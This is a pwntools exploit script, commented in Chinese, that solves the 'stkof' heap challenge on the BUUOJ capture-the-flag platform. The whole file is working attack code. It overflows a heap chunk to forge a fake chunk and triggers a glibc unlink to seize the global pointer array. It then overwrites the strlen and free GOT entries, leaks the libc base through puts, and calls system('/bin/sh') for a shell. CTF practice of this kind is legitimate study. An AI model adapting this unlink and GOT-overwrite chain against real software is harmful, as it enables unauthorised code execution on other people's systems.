from pwn import *
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

context.terminal = ["tmux","splitw","-h"]
# p = remote('')
if args.LOCAL:
    # 本地用2.23libc调试
    ld_path = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so'
    libc_path = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'
    # libc_path = './libc.so.6'
    p = process([ld_path, './stkof'], env = {'LD_PRELOAD': libc_path})
    gdb.attach(p)
else:
    libc_path = './libc.so.6'
    p = remote('node4.buuoj.cn', 26958)

def add(size: int):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    p.recvuntil(b'OK\n')

def edit(index: int, size: int, content: bytes):
    p.sendline(b'2')
    p.sendline(str(index).encode())
    p.sendline(str(size).encode())
    assert len(content) == size, "make sure you entered the correct input"
    p.send(content)

def delete(index: int):
    p.sendline(b'3')
    p.sendline(str(index).encode())

def show(index: int):
    p.sendline(b'4')
    p.sendline(str(index).encode())


s_addr = 0x602140
libc = ELF(libc_path)
e = ELF('./stkof')

# 程序在调用fgets和printf之前没用执行setbuf操作，所以第一次调用fgets和printf的时候，这两个函数会申请chunk。
# 导致第一个申请的堆块与其它堆块不连续。
add(0x1000) # idx 1
# 申请3个连续的堆块
add(0x90) # idx 2
add(0x80) # idx 3
add(0x10) # idx 4

# 通过堆溢出改写chunk3的prev_inuse位，并且构造fake chunk
# fake chunk的fd->bk和bk->fd指向s[2]
payload1 = b'a'*8 + p64(0x91)
payload1 += p64(s_addr-8) + p64(s_addr)
payload1 = payload1.ljust(0x90, b'a')
payload1 += p64(0x90) + p64(0x90)

edit(2, len(payload1), payload1)

# free chunk3，触发对于chun2的unlink操作，改写s[2]内容为&s[2]-0x18
delete(3)

# 修改s数组内容
payload2 = b'a'*8
payload2 += p64(e.got['strlen']) # s[0]
payload2 += p64(e.got['free'])   # s[1]
edit(2, len(payload2), payload2)

# 修改strlen@got为puts@plt
edit(0, 8, p64(e.plt['puts']))

# 泄露free@got内容
show(1)

# 计算libc基址
free_address = u64(p.recvuntil(b'\x7f')[-6:]+b'\x00'*2)
libc_base = free_address - libc.sym['free']
system_addr = libc_base + libc.sym['system']

# 修改free@got
edit(1, 8, p64(system_addr))

# 写入 "/bin/sh"，执行system("/bin/sh")
edit(4, 8, b'/bin/sh\x00')
delete(4)

p.interactive()
